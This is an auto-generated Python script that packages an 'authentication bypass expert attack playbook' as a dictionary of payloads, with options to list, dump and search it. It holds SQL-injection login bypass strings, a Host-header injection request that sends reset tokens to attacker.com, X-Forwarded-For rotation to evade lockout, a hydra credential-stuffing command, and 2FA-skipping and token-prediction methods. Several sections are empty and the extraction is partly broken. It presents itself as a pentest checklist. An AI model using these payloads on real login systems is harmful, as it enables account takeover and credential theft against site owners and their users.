#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/authbypass-authentication-flaws

Skill: SKILL: Authentication Bypass — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-authbypass-authentication-flaws.py --help
      python hack-skills-authbypass-authentication-flaws.py --list
      python hack-skills-authbypass-authentication-flaws.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/authbypass-authentication-flaws'
TITLE = 'SKILL: Authentication Bypass — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: authbypass-authentication-flaws", "description: >-", "Authentication bypass testing playbook. Use when assessing login flows, password reset logic, account recovery, MFA bypass, token predictability, brute-force resistance, and session boundary flaws."],
    'skill-authentication-bypass-expert-attack-playbook': [],
    '0-authorized-credential-test-planning': ["After reducing routing entries, default credentials, username variants, port focus, and wordlist sizing are handled here in one place."],
    'service-first-tiny-sets': [],
    'username-classes': [],
    'wordlist-sizing-and-port-focus': ["Prioritize common ports and service surfaces: 80/443/8080/8443 admin panels, 22 SSH, 21 FTP, and 3306/5432/6379/27017 data or management services."],
    '1-sql-injection-login-bypass': ["Classic but still found in legacy systems, custom ORMs, and raw query code:", "```sql", "-- Basic bypass (admin user assumed first row):", "Username: admin'--", "Password: anything", "\u2192 Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'", "-- Generic bypass (logs in as first user in DB):", "Username: ' OR '1'='1'--", "Password: anything", "\u2192 Query: SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='anything'", "-- Blind: does this work?", "Username: ' OR 1=1--", "Username: admin' OR 'a'='a", "Username: 1' OR '1'='1'/*", "Username: 1 or 1=1", "**Test each field separately** \u2014 only one field may be vulnerable."],
    '2-password-reset-vulnerabilities': [],
    'guessable-predictable-reset-tokens': ["Check if reset token is based on:", "- Timestamp: token=1691234567890 (Unix time)", "- Sequential: token=1001, 1002, 1003", "- MD5(email): echo -n \"user@example.com\" | md5sum", "- MD5(username+timestamp): reversible", "- Short token (4-6 digits): brute-forceable", "**Test**: Request 3 consecutive reset emails, compare token patterns."],
    'reset-token-not-expiring': ["1. Request password reset \u2192 get token via email", "2. Wait 48+ hours (token should expire)", "3. Use old token \u2192 does it work?"],
    'reset-token-reuse': ["1. Request reset \u2192 get token T1", "2. Complete reset with T1", "3. Use T1 again \u2192 does it work again?"],
    'host-header-injection-in-reset-email': ["When application generates reset URL using `Host` header:", "```http", "POST /forgot-password HTTP/1.1", "Host: attacker.com           \u2190 inject attacker's domain", "Content-Type: application/x-www-form-urlencoded", "email=victim@target.com", "\u2192 Reset email sent to victim with link pointing to `attacker.com/reset?token=VICTIM_TOKEN`", "\u2192 Victim clicks \u2192 token captured by attacker", "**Test**: Send password reset with modified `Host:`, check email for where reset link points."],
    'password-reset-token-in-referer': ["1. Request reset \u2192 go to reset URL with token", "2. Reset page loads third-party resources (analytics, fonts)", "\u2192 Referer header leaks: https://target.com/reset?token=TOKEN", "\u2192 Third-party server receives token in logs"],
    'password-change-without-current-password': ["PUT /api/user/password", "{\"new_password\": \"hacked\"}", "\u2192 No current_password field required?", "\u2192 Combine with CSRF for account takeover"],
    '3-account-enumeration': ["Identifying valid usernames/emails enables targeted attacks:"],
    'error-message-difference': ["Invalid username \u2192 \"User not found\"", "Valid username, wrong pass \u2192 \"Incorrect password\"", "\u2192 Enumerate valid accounts"],
    'response-time-difference': ["Invalid username \u2192 fast response (no DB lookup)", "Valid username \u2192 slightly slower (DB lookup + hash comparison)", "\u2192 Timing oracle"],
    'password-reset-flow': ["POST /forgot-password {\"email\": \"nonexistent@example.com\"}", "\u2192 \"If this email exists, we sent a reset link\" (proper)", "\u2192 \"This email is not registered\" (enumeration possible)"],
    'registration-endpoint': ["POST /register {\"email\": \"victim@example.com\"}", "\u2192 \"Email already registered\" \u2192 confirms account exists", "\u2192 \"Verification email sent\" for both \u2192 no enumeration"],
    '4-brute-force-bypass': [],
    'lockout-after-n-attempts-then-resets': ["Lockout at 10 attempts \u2192 try 9 wrong passwords \u2192 lock", "Wait for reset period (usually 30 min or 1 hour)", "\u2192 Try 9 more \u2192 repeat \u2192 no permanent lockout"],
    'ip-based-lockout-bypass': ["X-Forwarded-For: 1.1.1.1       \u2190 change each request", "X-Real-IP: 2.2.2.2", "Rotate through IPs in header"],
    'username-cycling-vs-password-cycling': ["Normal brute: try many passwords for one user \u2192 lock", "Reverse brute: try ONE password for many users", "\u2192 \"password123\" against all users \u2192 find those with weak password", "\u2192 No single account locked out"],
    'credential-stuffing': ["Use breached credentials from HaveIBeenPwned datasets against target:", "```bash"],
    'tools-hydra-burp-intruder-custom-scripts': ["hydra -C credentials.txt https-post-form://target.com/login:\"username=^USER^&password=^PASS^\":\"error message\""],
    '5-multi-factor-authentication-bypass': [],
    'session-cookie-before-2fa-completion': ["Flow: Login (password correct) \u2192 redirect to 2FA page \u2192 enter code", "Attack: After password step, session cookie is set but 2FA not yet checked.", "\u2192 Use session cookie to directly access /dashboard", "\u2192 Skip 2FA page entirely"],
    '2fa-code-brute-force': ["4-6 digit TOTP codes = 1,000,000 possibilities max", "If no lockout on 2FA step:", "\u2192 Brute force all codes (tool: Burp Intruder, sequential)", "\u2192 TOTP windows: 30-second window, some accept previous/next window"],
    '2fa-on-critical-actions-not-on-login': ["Login doesn't require 2FA, but:", "DELETE /account or POST /transfer requires 2FA", "Attack: Is 2FA checked on those actions or only on login?", "\u2192 If only login: log in once \u2192 no 2FA needing verification for actions"],
    '2fa-backup-code-abuse': ["Generate backup codes (usually 8-10 single-use)", "Test:", "\u2192 Are backup codes rate-limited?", "\u2192 Can backup codes be used multiple times?", "\u2192 Short codes (6-8 chars)? Brute-force if no rate limit"],
    '2fa-code-reuse': ["TOTP codes valid for one use", "\u2192 Use same TOTP code twice \u2192 does second use work?", "\u2192 Replay attack if server doesn't track used codes"],
    '6-oauth-sso-account-takeover-patterns': [],
    'email-claim-trust': ["1. Create account at attacker-controlled OAuth provider", "2. Set email claim = victim@target.com", "3. Link/login via that provider", "\u2192 If server trusts email claim without verification \u2192 account merge/takeover"],
    'password-doesn-t-apply-after-sso-link': ["1. User links Google SSO", "2. User forgets password (account has no password set after SSO only)", "3. \"Forgot Password\" flow \u2192 resets password even for SSO-only accounts?", "\u2192 Can set password \u2192 now bypass SSO \u2192 direct login"],
    '7-username-password-field-manipulation': [],
    'long-password-dos-bypass': ["Some apps hash passwords before sending to database.", "bcrypt has 72-byte limit \u2014 input beyond 72 bytes is ignored.", "Attack:", "\u2192 Register with password \"A\"*100", "\u2192 Login with password \"A\"*72 \u2192 same hash \u2192 works", "\u2192 Login with \"A\"*71 + \"totally different\" \u2192 if truncation \u2192 same hash if first 72 chars match"],
    'null-byte-in-username': ["username=admin%00 vs username=admin", "\u2192 Null byte truncation in some string comparisons", "\u2192 \"admin\\0attacker\" = \"admin\" in C-string comparison"],
    'unicode-normalization': ["Username: \"\u24e2cott\" \u2192 normalizes to \"scott\" \u2192 impersonates \"scott\"", "Username: \"admin\" (various Unicode homoglyphs for letters a,d,m,i,n)"],
    '8-session-management-flaws': [],
    'session-not-invalidated-on-logout': ["1. Log in \u2192 capture session cookie", "2. Log out", "3. Replay captured session cookie \u2192 still valid?", "\u2192 Session not server-side invalidated"],
    'session-not-regenerated-on-privilege-change': ["1. Log in as low priv \u2192 get session cookie", "2. Admin upgrades your role", "3. Old session cookie now has admin access?", "\u2192 Session not regenerated \u2192 old token inherits new privileges"],
    'predictable-session-tokens': ["Token: base64(userid+timestamp) \u2192 reversible", "Token: sequential integers \u2192 session ID= your_session_id -/+ small number", "Token: short random (32-bit entropy) \u2192 brute-forceable"],
    '9-authentication-testing-checklist': ["\u25a1 Try SQL injection on login fields (' OR 1=1--)", "\u25a1 Test password reset: predict token, host header injection, Referer leak", "\u25a1 Test account enumeration via error messages / timing", "\u25a1 Check 2FA: skip step (direct URL), brute force codes, reuse codes", "\u25a1 Test brute force protections: X-Forwarded-For bypass, reverse brute", "\u25a1 Check session invalidation on logout", "\u25a1 Check session regeneration after privilege change", "\u25a1 Test password change requiring current password", "\u25a1 Test long passwords (bcrypt 72-byte truncation)", "\u25a1 OAuth/SSO: test email claim trust, password set after SSO", "\u25a1 Check remember_me tokens: how long, revocable, predictable?"],
    '10-password-reset-attack-matrix-22-patterns': [],
    '11-captcha-verification-bypass-patterns-20-methods': [],
    '12-insecure-randomness-token-prediction': [],
    'uuid-v1-time-based-predictable': ["UUID v1 format: timestamp-clock_seq-node(MAC)"],
    'mac-address-often-leaked-via-other-endpoints': [],
    'timestamp-is-100ns-intervals-since-1582-10-15': [],
    'tool-guidtool-reconstruct-possible-uuids-from-known-timestamp-range': [],
    'mongodb-objectid': ["ObjectId = 4-byte timestamp + 5-byte random + 3-byte counter"],
    'first-4-bytes-unix-timestamp-creation-time-leaked': [],
    'counter-is-sequential-adjacent-objectids-predictable': [],
    'if-you-know-one-objectid-nearby-ones-are-calculable': [],
    'php-uniqid': ["```php", "uniqid() = hex(microtime)", "// Output: 5f3e7a4c1d2b3", "// Entirely based on current microsecond timestamp", "// Predictable if you know approximate server time"],
    'php-mt-rand-recovery': [],
    'mt-rand-uses-mersenne-twister-prng': [],
    'after-observing-624-outputs-full-internal-state-is-recoverable': [],
    'tool-openwall-php-mt-seed': [],
    'feed-known-outputs-recover-seed-predict-all-future-values': [],
    'tools': ["- `guidtool` \u2014 UUID v1 reconstruction", "- `AethliosIK/reset-tolkien` \u2014 Automated token prediction for password resets", "- `openwall/php_mt_seed` \u2014 PHP mt_rand seed recovery", "- `sandwich` \u2014 Token timestamp analysis"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()